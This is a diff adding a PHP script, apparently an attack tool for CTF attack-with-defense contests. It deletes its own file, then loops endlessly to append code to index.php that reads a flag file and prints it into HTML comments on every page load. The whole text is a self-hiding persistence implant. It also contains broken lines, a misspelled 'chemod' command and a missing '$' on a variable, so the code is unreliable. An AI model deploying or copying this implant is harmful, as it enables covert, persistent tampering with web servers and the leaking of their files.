@@ -1,0 +1,17 @@
+<?php
+error_reporting(0);
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+
+$file='./index.php';  //这里填入你要插入代码的php如index.php
+$flag_path='/flag'; //flag默认路径,有变化需要修改
+$code="<?php \\\$a=file_get_contents('".$flag_path."'); echo '<!-- ';echo \\\$a;echo '-->'; ?>";
+$cmd='echo "'.$code.'" >>'.$file;
+while(1){
+	system('chemod 777 '.file);
+	system($cmd);
+	sleep(30);
+}
+
+?>
